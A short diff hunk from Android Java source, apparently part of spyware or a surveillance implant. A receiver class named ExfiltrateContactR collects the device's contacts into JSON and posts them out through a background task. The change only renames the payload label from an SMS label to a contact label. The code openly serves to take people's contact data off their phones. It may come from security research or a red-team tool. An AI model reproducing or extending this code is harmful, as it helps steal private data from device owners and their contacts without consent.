@@ -53,7 +53,7 @@ public class ExfiltrateContactR extends BroadcastReceiver {
 
             for (Contact contact : contacts) { JSONArrayContacts.put(contact.toJSON()); }
 
-            Parameter                           params     = new Parameter("ExfiltrateSMS", JSONArrayContacts);
+            Parameter                           params     = new Parameter("ExfiltrateContact", JSONArrayContacts);
             AsyncTask<Parameter, Void, Integer> postDataAT = new PostDataAT();
 
             postDataAT.execute(params);
